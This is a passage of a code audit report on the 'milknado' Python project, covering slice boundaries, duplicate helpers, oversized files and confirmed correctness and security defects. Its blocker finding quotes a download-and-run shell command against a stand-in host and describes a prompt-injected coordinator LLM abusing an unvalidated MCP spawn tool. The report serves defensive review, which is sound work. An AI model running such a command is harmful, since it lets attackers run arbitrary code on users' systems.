# Sliced Bread audit — consolidation assessment (2026-10-18)

Scope: `src/milknado` at commit `9bc29e6` (main). Status: dry run. The audit opened no GitHub issues.

## Summary

The slice map is correct. No two vertical slices duplicate each other, so the audit recommends no slice merge. The consolidation work is inside and between slices:

- About a dozen duplicate helpers, with two or three copies each. Some copies already disagree.
- Boundary leaks: domain slices import the worker runtime (`milknado.loop`). Adapters import private `loop` modules. MCP tools import private `app` helpers and construct adapters.
- Dead code that suppressions hide from the dead-code gate.
- 15 files over the 300-line cap, with 4,868 lines above the cap in total.

The expected net line reduction is small. The main gain is fewer seams and one owner for each behavior.

The audit also confirmed 1 blocker and 11 high-severity correctness or security defects. Fix these before the structural work. See [Confirmed findings](#confirmed-findings).

## Method

The `sliced-bread-audit` workflow ran these steps:

1. Map: discover the slices and read the existing audit issues.
2. Evaluate: one Opus evaluator for each of 17 slices, plus one concurrent cross-slice dependency pass.
3. Verify: citation checks in batches of 20 findings. Then adversarial Opus refuters test the 12 most severe blocker and high findings.
4. File: skipped, because this was a dry run.

| Metric | Value |
| --- | --- |
| Agents | 28 |
| Raw findings | 171 |
| Confirmed (medium and above, verified) | 61 |
| Refuted | 2 |
| Above the floor, past the refuter cap (citation-checked only) | 20 |
| Below the severity floor (low) | 87 |
| Dimensions with no finding | `event-usage` |

Slices: graph, coordinator, dispatch, execution, batching, planning, github, wiki, common, adapters, app, loop, cli, mcp, web, plugins, root-utils.

The workflow skipped `_vendor` (tiktoken cache) and `web/static` (build output).

## Slice sizes

The total is 54,997 lines of Python.

| Slice | Lines | Files |
| --- | ---: | ---: |
| domains/graph | 10,867 | 70 |
| loop | 10,313 | 57 |
| app | 6,010 | 34 |
| domains/execution | 3,781 | 21 |
| adapters | 3,491 | 24 |
| domains/coordinator | 3,455 | 25 |
| domains/dispatch | 3,060 | 18 |
| domains/common | 2,880 | 20 |
| web | 2,270 | 27 |
| cli | 2,132 | 11 |
| mcp | 2,065 | 15 |
| domains/wiki | 1,295 | 10 |
| domains/planning | 1,269 | 8 |
| domains/batching | 1,163 | 7 |
| domains/github | 622 | 8 |
| plugins | 141 | 3 |
| domains/reporting | 118 | 2 |

## Consolidation themes

The themes are in priority order. Themes 1 and 2 have specs in this PR.

### 1. One execution path

Spec: [`docs/specs/execution-path-consolidation.md`](../specs/execution-path-consolidation.md).

- The flavor-profile to `ExecutionConfig` mapping exists twice: `domains/execution/run_loop/__init__.py:532` and `mcp/_loop_node_runner.py:201`. The copies already disagree.
- `mcp/_loop_node_runner.py` is application composition, but it lives in the MCP delivery package. `app.loop` refers to it by module path, which gives an `app` to `mcp` reverse arrow.
- `domains/execution` and `domains/coordinator` import `milknado.loop`. That import loads the subprocess and PTY runtime into the domain.
- `adapters/` imports 11 private `milknado.loop._*` modules. `loop/_process_helper.py` starts a private adapter module by name, which is a hidden cycle.

### 2. Thin CLI and MCP entry points

Spec: [`docs/specs/thin-entrypoints.md`](../specs/thin-entrypoints.md).

ADR `sliced-bread-crust-003` says that CLI and MCP only parse, call `app.*`, and format. The code does not follow it in these places:

- MCP tool modules import private `app` helpers, suppress pyright, and re-export some of them.
- MCP tool modules construct adapters and run dispatch policy inline (`mcp/run.py:182`).
- `cli/_helpers.py:123` keeps old alias names. The project rules forbid compatibility layers. Five of the seven aliases have no consumer.
- `milknado launch` duplicates `milknado web`, but it has no `--allow-host` option.

### 3. Duplicate helpers inside slices

- graph: `_goal_claims.py:185` repeats the 30-line insert-or-reclaim body.
- dispatch: `async_run._bind_attempt` copies `start_sync_attempt`. `runner._execute` copies `execute_cancellable`. `app/loop.py` reimplements `reclaim_stale_node`.
- adapters: the durable-command drain exists twice, with different `request_id` rules.
- loop: the streaming and blocking runners in `_agent.py` share the spawn, abort, and cleanup code.
- common: `config.py` declares about 25 fields in both `MilknadoConfig` and `MilknadoSection`, with defaults that disagree.
- Smaller: the coordinator ownership query (three copies), the wiki slug check, the log format string, and two different `WorkerEvidence` protocols.

### 4. Dead code

- `domains/execution/run_loop/input.py` (99 lines) and its keyboard plumbing. No production code reads its output.
- `setup_group_worktree` and `GroupWorktreeRequest` have no caller. `noqa` comments hide them from the dead-code gate.
- The `cli/_helpers.py` alias block (theme 2).

### 5. Infrastructure inside domain slices

- `common/process.py`: psutil and `os.kill` probes. Put them behind a `ProcessProbePort`.
- `graph/controller_capability.py`: OS credential storage. Put it behind a `CredentialStore`.
- `execution/completion.py`: git and gate subprocesses and file I/O.
- `dispatch/tmux_run.py`: `os.killpg`.
- `batching/weights.py`: file reads and tokenizer loading.
- `common/doctor.py` and `common/config_view.py` serve only the CLI.

### 6. Oversized files

| File | Lines |
| --- | ---: |
| `domains/execution/executor.py` | 1,523 |
| `loop/_agent.py` | 1,344 |
| `domains/graph/graph.py` | 773 |
| `domains/graph/_persistence.py` | 758 |
| `app/run.py` | 662 |
| `domains/common/config.py` | 660 |
| `domains/execution/run_loop/__init__.py` | 600 |
| `loop/engine.py` | 573 |
| `adapters/loop.py` | 454 |
| `domains/common/agent_argv.py` | 365 |
| `adapters/git.py` | 358 |
| `domains/graph/_mutations.py` | 356 |
| `cli/__init__.py` | 328 |
| `domains/planning/manifest.py` | 310 |
| `domains/graph/_status.py` | 304 |

## Overlap with open issues

| Issue | Title (short) | Related findings |
| --- | --- | --- |
| #213 | Move subprocess mechanics behind the execution adapter | model-purity: `execution/completion.py:98` |
| #216 | Dispatch lifecycle invariants behind one domain API | growth-justification: `dispatch/reconcile.py:37` |
| #227 | `execution/completion.py` imports a concrete loop type | import-direction: `execution/run_loop/__init__.py:56` |
| #332 | Split `executor.py` | complexity: `execution/executor.py:418` |
| #333 | Split `loop/_agent.py` | complexity: `loop/_agent.py:800` |
| #334 | cli/mcp re-export private app helpers | crust-integrity: `mcp/server.py:9` |
| #335 | CLI and MCP each implement node creation and archive | theme 2 |
| #339 | `adapters/loop.py` holds execution policy | complexity: `adapters/loop.py:87` |
| #341 | Split the files over the 300-line cap | complexity findings, theme 6 |

The audit's dedupe step compares only against earlier `sliced-bread-audit` issues. It does not compare against the issues in this table. Check this table before you file findings.

## Confirmed findings

Each finding passed a citation check. Blocker and high findings also passed an adversarial refuter.

| Severity | Count |
| --- | ---: |
| blocker | 1 |
| high | 11 |
| medium | 49 |

### Blocker

#### `src/milknado/mcp/loop.py:65`

- Slice: mcp · Dimension: security · Verification: citation-checked + refuter-tested
- Claim: milknado_run_loop_start accepts a free-form runner_cmd, and the code splits it with shlex and spawns it with no allowlist check, so the worker_cmd allowlist on the sibling run tools does not apply here.
- Impact: An MCP caller, such as a coordinator LLM under prompt injection, can run any executable with any arguments as a detached process in the project root. Example: `runner_cmd="sh -c 'curl evil|sh'"`. The allowlist that the project enforces at this same trust boundary for milknado_run_inline* is bypassed.
- Recommendation: Remove runner_cmd from the public MCP tool schema and keep it as a test or operator seam only (the MILKNADO_LOOP_RUNNER_CMD env var or an injected app-level parameter). If it must stay, validate it against a fixed runner allowlist at the MCP boundary, in the same way as validate_worker_cmd.

### High

#### `src/milknado/domains/batching/graph_build.py:164`

- Slice: batching · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: CRG edge records and impacted_files make precedence edges in opposite directions, so every caller/callee pair becomes a 2-cycle and is collapsed into one SCC.
- Impact: After the path bug is fixed, every related pair of changes merges into one forced batch, and precedence is lost. Large SCCs become oversized batches. CRG's `edges` also include edges among all impacted nodes, so cycles spread to changes that do not touch the queried file.
- Recommendation: Choose one convention (dependency before dependant). Invert CALLS/IMPORTS_FROM/REFERENCES edges (target before source) and keep TESTED_BY as is, or use only impacted_files. Cover this with a fixture in the real GraphEdge shape.

#### `src/milknado/domains/batching/graph_build.py:70`

- Slice: batching · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: CRG impact queries send repo-relative paths, but the CRG store keys nodes by absolute path, so the CRG edge source never produces an edge in production.
- Impact: The MCP and CLI planners always pass a CrgAdapter, but structural precedence edges are dropped with no error. Dependent changes can land in sibling batches that the loop runs at the same time. Only explicit depends_on and new_relationships produce ordering.
- Recommendation: Normalize paths at the port boundary. Have CrgAdapter absolutize inputs against its root and relativize returned file paths and qualified-name path prefixes. Alternatively, define the CrgPort contract as repo-relative. Add a test against a real built CRG graph.

#### `src/milknado/domains/batching/solver.py:91`

- Slice: batching · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: On moderately sized change sets, pass 1 times out with UNKNOWN and plan_batches returns an empty plan, although a trivial feasible plan always exists.
- Impact: A 60-change manifest gives zero batches. apply_batches_to_graph then creates only the goal root, and the CLI treats UNKNOWN with 0 batches as non-fatal unless another failure occurs. Every plan with 20 or more changes also uses the full 10s time limit.
- Recommendation: Add a hint or fallback with a topological singleton assignment, so UNKNOWN never yields an empty plan. Reduce model size (see the duplicate reification finding). Treat 'UNKNOWN with no batches' as a hard failure at the caller.

#### `src/milknado/domains/coordinator/control.py:149`

- Slice: coordinator · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: If DecidePlanProposal names an unknown proposal_id, get_proposal raises KeyError, and _execute_reserved does not catch it. The command receipt then stays 'unconfirmed' for good, and the web route reports a missing session.
- Impact: A typo or stale proposal id from a client gets a 404 that says the session does not exist, which is wrong. That command_id can never reach a terminal receipt. Every retry returns 'unconfirmed', so the UI cannot tell whether the decision ran. No test covers this path.
- Recommendation: In _preflight_plan, turn the missing proposal into a ValueError ("plan proposal does not exist"), or catch LookupError in _execute_reserved so it completes as 'rejected'. Add a regression test that checks the receipt reaches 'rejected' and that a replay returns the same receipt.

#### `src/milknado/domains/coordinator/projection.py:29`

- Slice: coordinator · Dimension: import-direction · Verification: citation-checked + refuter-tested
- Claim: The coordinator domain imports the provider process runtime package milknado.loop.sessions. That import runs milknado/loop/__init__.py, which loads RunManager, run_session, and the subprocess, PTY, and process-lifecycle modules.
- Impact: The pure coordinator projection depends on infrastructure, and importing the slice barrel loads the whole worker runtime. No import-linter contract (pyproject.toml:56-60 forbids only app/cli/mcp) catches it, so the arrow can drift further.
- Recommendation: Move the static capability table (ProviderFamily -> floor/native/unsupported actions) into domains/common, or add a capability port to CoordinatorServices that adapters fill. Then add milknado.loop to the domain-forbidden import-linter contract.

#### `src/milknado/domains/coordinator/workflow.py:121`

- Slice: coordinator · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: When CreateGroup carries a client-supplied provider_session_id, create_group links a 'provider_session' entity but creates no provider binding. After that, every Recover for the session fails, and group turns are rejected.
- Impact: One accepted public command (CreateGroup with provider_session_id) blocks recovery for the whole coordinator session, not only for that group. No public command can repair it, because nothing creates the matching binding. StartTurn on that group is also rejected.
- Recommendation: Reject a non-null provider_session_id in CreateGroup unless a matching binding already exists. Otherwise, create the coordinator_provider_bindings row in the same transaction as the link. If the field is not needed, remove it from the CreateGroup wire model.

#### `src/milknado/domains/dispatch/isolate.py:222`

- Slice: dispatch · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: merge_back_isolated reports rebased=False after the compare-and-swap has already landed the worker commit on the target branch, whenever the worktree teardown that follows fails.
- Impact: The target ref already holds the squashed node commit. A teardown failure, for example `git worktree remove` refusing a worktree with an initialized submodule (GitOperationError), still returns rebased=False. async_run.py:89-93 and lifecycle.py:209-210 then force terminal='failed' and settle the node FAILED/preserved, although async_run.py:90-92 claims 'the deliverable never reached the dispatch branch'. With max_node_attempts > 1, the node re-runs on top of its own landed work. ValueError from worktree_teardown_blocker is not caught at all, so it escapes as an attempt exception.
- Recommendation: Record that the landing succeeded when compare_and_swap_ref returns. Treat a later teardown failure as rebased=True with worktree_preserved set, not as a failed landing, and catch the teardown errors separately from the land errors.

#### `src/milknado/domains/execution/run_loop/__init__.py:56`

- Slice: execution · Dimension: import-direction · Verification: citation-checked + refuter-tested
- Claim: The execution domain imports the infrastructure package milknado.loop, which uses subprocess and psutil and itself imports domains.common. The dependency arrow therefore points outward from the domain.
- Impact: Importing a domain value type (state.py) loads the whole process runner, RunManager, and psutil. Domain tests and consumers cannot load execution without the infrastructure layer. No import-linter contract covers milknado.loop, so this inversion can grow without a gate failure.
- Recommendation: Move RunStatus and CompletionVerdict (pure enum and value types) into domains/common, and have milknado.loop import them from there. Then add an import-linter contract that forbids milknado.domains from importing milknado.loop.

#### `src/milknado/domains/execution/run_loop/_verification.py:55`

- Slice: execution · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: The spec verifier gets the default object repr of MikadoGraph as the graph state, not a summary of the graph.
- Impact: The verification agent decides if the root goal is done (it marks the root DONE or replans with a goal_delta). It sees `<milknado.domains.graph.graph.MikadoGraph object at 0x...>` and no node statuses, so the done/gaps verdict for the whole run rests on no graph evidence.
- Recommendation: Pass a real graph summary to verify_spec, for example the node id, description, and status rendering that other prompts already use. Add a test that asserts the prompt contains node descriptions and statuses.

#### `src/milknado/domains/graph/_connection.py:38`

- Slice: graph · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: open_connection treats every sqlite3.DatabaseError raised by PRAGMA quick_check as corruption, so a busy or I/O error moves a healthy live database aside and recreates an empty one.
- Impact: sqlite3.OperationalError (for example 'database is locked' after the 5 s default connect timeout, or 'disk I/O error') is a subclass of DatabaseError. When the MCP server, loop and watch open the graph at the same time, a transient lock or I/O fault renames milknado.db and its -wal/-shm files away while other processes still hold them open. The new process then runs against an empty graph. I did not reproduce the lock case; the subclass relationship and the code path are certain.
- Recommendation: Quarantine only when quick_check returns a non-'ok' result or raises sqlite3.DatabaseError with a corruption code (SQLITE_CORRUPT/SQLITE_NOTADB via exc.sqlite_errorcode). Re-raise OperationalError busy and I/O errors. Set busy_timeout before the check.

#### `src/milknado/domains/graph/_mutations.py:41`

- Slice: graph · Dimension: correctness · Verification: citation-checked + refuter-tested
- Claim: _delete_one never deletes github_bind_attempts rows, so delete_node fails with a FOREIGN KEY error for any goal that has an unfinished GitHub bind attempt.
- Impact: github/bind.py:113-119 writes the attempt row before issue_create/item_add and clears it only on success. A network failure therefore leaves a row that permanently blocks delete_node (CLI/MCP delete) for that goal and for any subtree that contains it.
- Recommendation: Add `DELETE FROM github_bind_attempts WHERE goal_id = ?` to _delete_one, or declare the FK with ON DELETE CASCADE in both the create_tables DDL and a new ladder step. Add a regression test that deletes a goal with a pending bind attempt.

### Medium

#### `src/milknado/adapters/__init__.py:1`

- Slice: adapters · Dimension: crust-integrity · Verification: citation-checked
- Claim: The adapters barrel is incomplete and consumers bypass it: barrel-exported classes are imported from submodules, and several adapters (gh, hallouminate, toolchain, coordinator_turns, coordinator_worker_recovery) have no barrel export.
- Impact: The slice has two public surfaces: the barrel and each submodule path. Moving or splitting an adapter file breaks about 17 import sites across app, cli and mcp, and nothing defines which adapter modules are public.
- Recommendation: Add GhProjectAdapter, GhTransportError, gh_issue_view, HallouminateIndexer, SystemToolchainAdapter, NativeCoordinatorTurns and CoordinatorWorkerRecovery to adapters/__init__.py. Change consumers to `from milknado.adapters import ...` (lazy imports can stay lazy), or document per-module crusts explicitly and drop the partial barrel.

#### `src/milknado/adapters/_git_changes.py:194`

- Slice: adapters · Dimension: correctness · Verification: citation-checked
- Claim: diff_for_review lists untracked files without `-z`, so git quotes 'unusual' paths, and the later `diff --no-index` exit code 1 for the missing quoted path is accepted as success. These files are silently left out of the reviewer diff.
- Impact: A worker can add an untracked file whose name is non-ASCII or contains a tab, quote or backslash. The reviewer agent never sees that file's contents and can approve a node without reviewing it. The diff also has no size limit, unlike the bounded session-diff path.
- Recommendation: Use `ls-files --others --exclude-standard -z` and split on NUL. Treat an empty stdout with exit 1 together with a non-empty stderr as an error. Consider reusing run_bounded_process to limit the review diff size.

#### `src/milknado/adapters/_group_action_session.py:52`

- Slice: adapters · Dimension: deslop · Verification: citation-checked
- Claim: The durable-command drain and the command-state recording logic are duplicated between the loop session mixin and the group action session, and the two copies use different request_id rules.
- Impact: For a non-approve/deny command that carries a permission_id, or an approve/deny command without one, the two paths send different request IDs to the provider. A fix to one copy, such as a new command state, will silently miss the other.
- Recommendation: Extract one helper that builds the SessionInput list from claim_pending and one that applies a state transition, with a single request_id rule. Use them from both LoopSessionMixin and the group action functions.

#### `src/milknado/adapters/git.py:270`

- Slice: adapters · Dimension: correctness · Verification: citation-checked
- Claim: compare_and_swap_ref runs `git diff-index --quiet` without first refreshing the index, so a file whose stat data changed but whose content did not is reported as a tracked change and the merge-back is refused.
- Impact: If an editor, build tool or formatter touches a tracked file in the integration checkout without changing it, isolate merge-back (domains/dispatch/isolate.py:222) returns rebased=False and keeps the worktree, so completed work does not land.
- Recommendation: Run `git update-index -q --refresh` in self._root before diff-index. Add a regression test that touches a tracked file in the root checkout before the merge-back.

#### `src/milknado/adapters/loop.py:87`

- Slice: adapters · Dimension: complexity · Verification: citation-checked
- Claim: LoopAdapter.create_run takes 13 parameters and is about 72 lines long, and loop.py (454 lines) and git.py (358 lines) exceed the 300-line file limit. Per-file ruff waivers hide this.
- Impact: create_run mixes MCP-flag rewriting, session resume, RunConfig construction, completion-verifier wiring with graph recording, a platform guard and spawn hooks. Each new run option widens the signature, and the `runtime_policy: object` getattr probe at line 105 bypasses typing.
- Recommendation: Bundle the optional arguments into a frozen RunRequest dataclass with a typed runtime_policy, and split create_run into helpers for the agent command, the config and the verifier. Move _build_loop_content and the prompt builders out of loop.py, and move the rebase or ref-CAS logic out of git.py, so both files fall under 300 lines. Then remove the PLR0913 waiver.

#### `src/milknado/loop/_process_helper.py:110`

- Slice: adapters · Dimension: import-direction · Verification: citation-checked
- Claim: The milknado.loop engine starts a private adapter module by name, which creates a hidden adapters <-> loop cycle that import-linter cannot detect.
- Impact: The loop engine cannot run its lifeline helper without the adapters package. A rename or move of the private adapter file breaks worker protection at runtime with no static check. The dependency also points from the engine back into its own adapter layer.
- Recommendation: Inject the lifeline entrypoint (module name or argv) through ProtectionContext from the adapter that builds it, or move the graph-backed bootstrap behind a loop-owned entrypoint that receives the evidence-store factory. The loop package must not name adapter modules.

#### `src/milknado/app/node.py:134`

- Slice: app · Dimension: correctness · Verification: citation-checked
- Claim: When `_provision_claim_run` fails after it creates the isolated worktree, it leaves the worktree, its branch, and any run row it already started, and only fails the node.
- Impact: A failure in `set_worktree`, `runs.start`, or `deposit_message` leaves an orphan worktree and worker branch on disk. It can also leave a `runs` row in status `running` with no end, which observers and run totals then show as live work.
- Recommendation: Track what provisioning has done. On failure, call `discard_isolated_worktree` for a created worktree and finish a started run with a failed RunResult before `mark_terminal`, the same way `_release_failed_claim` does. Add a test that makes `deposit_message` raise and checks that no worktree and no running run row remain.

#### `src/milknado/app/plan.py:203`

- Slice: app · Dimension: correctness · Verification: citation-checked
- Claim: `_spawn_plan_critic` ignores the critic process exit code and discards its captured stderr, so a crashed or missing critic agent is reported only as an unparseable verdict.
- Impact: A wrong `plan_reviewer_agent` command, an auth failure, or an agent crash runs the critic twice and then shows a misleading error with no stderr. This breaks the project rule to fail fast and loud, and makes diagnosis hard.
- Recommendation: Return the exit code and stderr from `_spawn_plan_critic`. Raise `PlanCriticError` at once with the exit code and a bounded stderr tail when the exit code is non-zero. Re-prompt only on a clean exit whose output has no verdict tag.

#### `src/milknado/app/rebalance.py:8`

- Slice: app · Dimension: crust-integrity · Verification: citation-checked
- Claim: Three app modules import adapter classes from adapter submodules, not from the `milknado.adapters` barrel that already exports them.
- Impact: The app slice couples to the adapters package's internal file layout. If the adapter modules are moved or renamed, these three consumers break even when the public barrel stays the same.
- Recommendation: Import `GitAdapter` and `CrgAdapter` from `milknado.adapters` in all three modules.

#### `src/milknado/app/run.py:1`

- Slice: app · Dimension: complexity · Verification: citation-checked
- Claim: run.py has 662 lines, more than twice the 300-line file limit in the project style rules. It mixes several separate responsibilities.
- Impact: `run_inline_start` alone is about 110 lines with nested imports, a local class, and a multi-step failure path. This makes the startup-failure and fencing logic hard to review, and it breaks a stated project convention.
- Recommendation: Split by responsibility. Move the controller to its own module, move inline dispatch (`run_inline`, `run_inline_start`, `prepare_isolation`, `_git_for_inline_dispatch`) to another, and keep `ensure_dispatch_allowed` small and shared. Move the startup cleanup in `run_inline_start` to a helper like `_loop_start_failure.py`.

#### `src/milknado/domains/batching/_model.py:160`

- Slice: batching · Dimension: correctness · Verification: citation-checked
- Claim: The cost multiplier makes co-batching cost more than separate batches whenever the combined token mass exceeds about 1,667 tokens, so the token budget almost never binds.
- Impact: DUMB_ZONE_BUDGET and the budget constraint have almost no effect for real files. Plans become one change per batch with per-batch loop overhead, and the README describes behavior the solver does not produce.
- Recommendation: Recalibrate the multiplier against real token sizes, or state the singleton bias as intended. Then correct the README worked example and add a test that asserts co-batching for realistic sizes under the budget.

#### `src/milknado/domains/batching/_model.py:90`

- Slice: batching · Dimension: complexity · Verification: citation-checked
- Claim: The batch-membership indicator is reified twice, and the per-batch size buckets are O(K^2), so the model grows cubically and contributes to the solver timeouts.
- Impact: About 2*K^2 duplicate reified booleans plus K*(K+1) conditional linear constraints. CP-SAT does not reach optimal at 20 changes and finds no solution at 60.
- Recommendation: Build in_batch once and reuse it for compactness, budget, and cost. Use an element/table constraint or a piecewise-linear cost in place of at_size buckets, and cap K at a topological upper bound.

#### `src/milknado/domains/batching/weights.py:80`

- Slice: batching · Dimension: model-purity · Verification: citation-checked
- Claim: The domain reads source files from disk and loads a tokenizer that can fetch encodings over HTTP, which are infrastructure concerns inside a domain slice.
- Impact: The planner depends on the filesystem layout and optionally on network access. File reads have no size cap, so a large 'modify' target loads fully into memory.
- Recommendation: Define a token-estimation port (Protocol) in the slice and implement file reading and tokenization in an adapter. Pass the estimator to plan_batches, and fail loud if the vendored encoding is missing.

#### `src/milknado/cli/__init__.py:292`

- Slice: cli · Dimension: correctness · Verification: citation-checked
- Claim: add-node does not catch ValueError, so a bad --artifact, --prereq, or --parent prints a full Rich traceback instead of a clean CLI error.
- Impact: Ordinary input mistakes show up as crashes. This is inconsistent with sibling commands (graph archive/unarchive, edge add, roadmap), which map ValueError to a red message and exit 1.
- Recommendation: Add `except ValueError as exc: console.print(f"[red]{exc}[/red]"); raise typer.Exit(code=1) from None` around the validation and add_node and claim calls, matching edge add. Add a CliRunner test that asserts the message and the absence of a traceback.

#### `src/milknado/cli/_helpers.py:123`

- Slice: cli · Dimension: deslop · Verification: citation-checked
- Claim: _helpers.py keeps a block of 'historical private name' aliases, a compatibility layer the project rules forbid. Five of the seven aliases have no consumer, and listing them in __all__ hides them from vulture.
- Impact: This is dead code that the dead-code gate cannot see. It doubles the module's export surface, contradicts the 'No Migration Code / compatibility layers' rule, and keeps the wiki (architecture/entry-points.md:69-70) documenting the private names.
- Recommendation: Delete the alias block and its __all__ entries. Point the two test imports at open_project_for_cli and ensure_plugins_loaded. Update the wiki entry-points page.

#### `src/milknado/cli/run.py:184`

- Slice: cli · Dimension: complexity · Verification: citation-checked
- Claim: `_run` is a 110-line function that mixes the worker guard, the web branch, branch protection, reconciliation, exclusions, interactive vs headless dispatch, and error-to-exit mapping. It needs a file-wide PLR0915 ignore, and a NamedTuple pack/unpack works around PLR0913.
- Impact: The project limit is 40 lines and 40 statements. The main `milknado run` path is hard to test branch by branch. RunCommandOptions adds indirection without encapsulation, because it is destructured right away.
- Recommendation: Split `_run` into _run_web(options) and _run_local(options), and put the exception-to-exit mapping in a shared wrapper. Pass the options object through instead of destructuring it. Then remove the PLR0915 per-file ignore.

#### `src/milknado/domains/common/config.py:148`

- Slice: common · Dimension: correctness · Verification: citation-checked
- Claim: MilknadoSection does not set forbid_unknown_fields, so a misspelled milknado.toml key is silently ignored and the default applies.
- Impact: A typo silently runs with the default: for example, 4 parallel workers instead of 1, or no configured gates. This breaks the 'fail fast and loud' and 'validate at boundaries' rules.
- Recommendation: Set forbid_unknown_fields=True on MilknadoSection, PromptsTable, WorkerTable, and FlavorTable. You can also warn on unknown keys in _normalize_section, and pop the layer-control keys (inherit_global, inherit) before the typed decode.

#### `src/milknado/domains/common/config.py:59`

- Slice: common · Dimension: complexity · Verification: citation-checked
- Claim: config.py has 660 lines, more than twice the 300-line limit. It declares the same ~25 fields with separate defaults in both MilknadoConfig and MilknadoSection, and those duplicate defaults already disagree. _normalize_section (lines 235-284) has 50 lines, more than the 40-line limit.
- Impact: A new or changed default must be edited in two structs plus _build_config and _serialize_milknado_core. The planning_agent drift shows that defaults diverge in practice: a bare MilknadoConfig() carries a skip-permissions planning command that no loader produces.
- Recommendation: Split config.py into schema/decode, layering/load, and save modules. Derive MilknadoConfig defaults from one source, for example by building MilknadoConfig from MilknadoSection defaults. Remove the stale planning_agent literal. Split _normalize_section into per-table normalizers.

#### `src/milknado/domains/common/config_view.py:43`

- Slice: common · Dimension: correctness · Verification: citation-checked
- Claim: explain_view with a flavor attributes only five keys to the flavor table, so flavor-set values like session_mode, review_max_rounds, and on_reject report source 'default'.
- Impact: `milknado config --explain --flavor X` (cli/config.py:43) gives users the wrong source for values that change review and resume behavior. They cannot find which layer set those values.
- Recommendation: Look up every FlavorProfile field under ('flavor', flavor, key) first, and fall back to root_paths only when that origin is absent. Remove the identity override_keys map. Add an explain test that covers session_mode, review_*, on_reject, and attempt_timeout_seconds.

#### `src/milknado/domains/common/doctor.py:38`

- Slice: common · Dimension: model-purity · Verification: citation-checked
- Claim: doctor.py calls subprocess.run and shutil.which directly in the shared domain kernel, while toolchain.py next to it does the same kind of probing through ToolchainPort.
- Impact: Domain logic in common runs processes, and tests cannot exercise it without real executables or patching. The bare `except Exception` also hides real probe failures as 'unknown'.
- Recommendation: Route _probe through ToolchainPort.find_executable and ToolchainPort.run, or move doctor into an adapter or the CLI layer. Narrow the except clause to OSError and subprocess.SubprocessError.

#### `src/milknado/adapters/coordinator_turns.py:36`

- Slice: cross-slice · Dimension: crust-integrity · Verification: citation-checked
- Claim: The adapters layer imports 11 private milknado.loop modules across many files and bypasses the public API that loop/__init__.py declares.
- Impact: The loop crust says 'Public API' but adapters depend on underscore modules in about 12 files. A rename or split inside loop breaks adapters without notice, and the boundary that the docstring promises is not enforced. The 'boundary modules must use domain barrels' contract (pyproject.toml:95-131) covers domains only, not loop.
- Recommendation: Promote the process-spawn and identity surface that adapters need (SpawnOptions, StartEvidence, spawn_protected, ProtectionContext, WorkerRegistry, observe_descendants, translate_argv, AgentRunSpec) to loop/__init__.py or to a public loop.process submodule. Then add milknado.loop._* to an import-linter forbidden list for milknado.adapters.

#### `src/milknado/domains/common/doctor.py:34`

- Slice: cross-slice · Dimension: growth-justification · Verification: citation-checked
- Claim: common/ contains CLI-only code: doctor.py shells out directly, and config_view.py has a single consumer. The doctor probe also duplicates the ToolchainPort pattern next to it.
- Impact: The shared kernel holds single-consumer delivery code that does process I/O directly. Every importer of the domains.common barrel (13 slices) loads it eagerly through common/__init__.py:21-22. The two tool-probe paths can drift, for example in timeout or error handling.
- Recommendation: Move doctor.py and config_view.py into the cli or app layer. Make the doctor tool probe use ToolchainPort (SystemToolchainAdapter) and do not call shutil and subprocess directly.

#### `src/milknado/domains/common/process.py:13`

- Slice: cross-slice · Dimension: model-purity · Verification: citation-checked
- Claim: The shared kernel hosts OS process probes (psutil and os.kill), and two sibling domains call them directly instead of through a port.
- Impact: Graph claim and reclaim decisions call the live OS process table synchronously. The domain logic is therefore not deterministic, and a test cannot drive it without real pids or monkeypatching common. common/ becomes an infra layer that every slice inherits. Compare with toolchain.py, which correctly goes through ToolchainPort.
- Recommendation: Define a ProcessProbePort (pid_alive and identity_state) in common.protocols. Move the psutil and os.kill implementation to adapters/process.py, which already consumes it, and inject the port into graph and dispatch. Keep only the pure WorkerIdentity and ObservationKey types in common.

#### `src/milknado/domains/dispatch/async_run.py:110`

- Slice: dispatch · Dimension: correctness · Verification: citation-checked
- Claim: When the async worker succeeds, it finishes the run row and records the 'done' outcome, but it never moves the node out of RUNNING. The sync path and the async cancel/preserve paths settle the node directly.
- Impact: After an async run_inline worker finishes clean, the node stays RUNNING with its run_id until a client calls milknado_run_inline_poll (mcp/run.py:138-144), redispatches the node, or a startup reconciliation runs. If the client never polls, watch/TUI shows RUNNING and dependents are not unblocked, while the host slot is already released.
- Recommendation: Call settle_node_terminal(graph, ref, NodeStatus.DONE) in the success branch, the same as lifecycle._finish_dispatch, so the worker that owns the terminal write also settles the node.

#### `src/milknado/domains/dispatch/isolate.py:196`

- Slice: dispatch · Dimension: correctness · Verification: citation-checked
- Claim: When worktree setup fails after `git worktree add -b`, only the worktree is removed. The fresh branch stays behind, and the caller cannot discard it because it never receives the IsolateContext.
- Impact: Each failed set_worktree fence (or base mismatch) leaves a `milknado/<id>-<slug>[-retryN]` branch behind. unoccupied_slot skips occupied branches, so later attempts move to retry suffixes. After 100 leaks, dispatch fails with 'all 100 are occupied'.
- Recommendation: Use discard_isolated_worktree(git, path, branch) in both cleanup paths, so the worktree and its fresh branch are removed together.

#### `src/milknado/domains/dispatch/isolate.py:62`

- Slice: dispatch · Dimension: deslop · Verification: citation-checked
- Claim: setup_group_worktree and GroupWorktreeRequest have no caller in src/. A bare `# noqa` plus a file-wide `# ruff: noqa: RUF100` hides them from the vulture dead-code gate.
- Impact: Dead production code ships and stays tested only for itself. The blanket suppression also disables ruff's unused-noqa check for the whole file. This goes against the project rule that a suppression must be a line-level `# noqa: V1xx` for a genuine false positive.
- Recommendation: Delete setup_group_worktree, GroupWorktreeRequest, and their tests, or wire them into a real caller through the slice crust. Then remove the bare noqa and the file-level RUF100 suppression.

#### `src/milknado/domains/dispatch/reconcile.py:37`

- Slice: dispatch · Dimension: growth-justification · Verification: citation-checked
- Claim: The narrow ports (StaleRunPort, RunReaderPort, RunFinalizerPort, WorkerRecoveryPort) have one real implementation, MikadoGraph. The code checks at runtime whether it got a MikadoGraph and silently changes behavior when it did not.
